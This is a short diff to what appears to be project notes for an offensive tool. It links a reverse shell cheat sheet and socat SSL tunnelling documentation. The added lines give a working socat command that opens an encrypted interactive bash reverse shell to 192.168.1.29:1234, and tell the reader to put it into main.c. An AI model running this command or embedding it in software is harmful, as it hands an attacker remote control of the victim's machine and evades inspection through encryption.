@@ -12,3 +12,8 @@ Look at "reverse shell cheat sheet":
 https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
 - How to secure it with ssl:
 http://www.dest-unreach.org/socat/doc/socat-openssltunnel.html
+
+command (replace the command in main.c):
+socat exec:'bash -li',pty,stderr,setsid,sigint,sane openssl-connect:192.168.1.29:1234,verify=0
+
+This bad boy gives you shell (but you need socat).
